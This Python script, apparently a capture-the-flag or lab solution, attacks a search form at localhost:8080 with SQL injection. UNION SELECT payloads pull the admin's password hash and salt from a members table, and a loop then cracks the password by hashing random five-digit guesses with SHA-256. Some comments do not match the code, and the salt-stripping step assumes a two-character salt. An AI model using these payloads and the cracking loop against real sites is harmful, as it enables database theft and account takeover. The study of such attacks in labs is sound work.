import requests
import random
import re
import hashlib
import string


url = "http://localhost:8080/search"  


data = {
    'name': '\hello" union select password_hash from members where username = \"admin\"; -- '
}
    
response = requests.post(url, data=data)
encrypted_password_match = re.search(r'<p>(.*)</p>', response.text)

if encrypted_password_match:
    print("Admin Password Hash: " + encrypted_password_match.group(1))
else:
    print("Admin Password Hash not found in the response.")
    


password_hash = encrypted_password_match.group(1)



data = {
    'name': '\hello" union select password_salt from members where username = \"admin\"; -- '
}
    
response = requests.post(url, data=data)
encrypted_password_match = re.search(r'<p>(.*)</p>', response.text)

if encrypted_password_match:
    print("Admin Salt: " + encrypted_password_match.group(1))


password_salt = encrypted_password_match.group(1)


while True:

    # The salt
    salt = password_salt

    # Generate random five character string using letters
    input = salt + ''.join(random.choices(string.digits, k=5)) 
    
    # Find the sha256 digest of the salted input
    digest = hashlib.sha256(input.encode()).hexdigest()
    
    
    # If a match is found, check that it starts on an odd index, since every two hex characters corrospond to one ASCII character.
    if digest == password_hash:

        # Print the password if it is a match yay
        print("Password: ", input[2:])
        break
 
 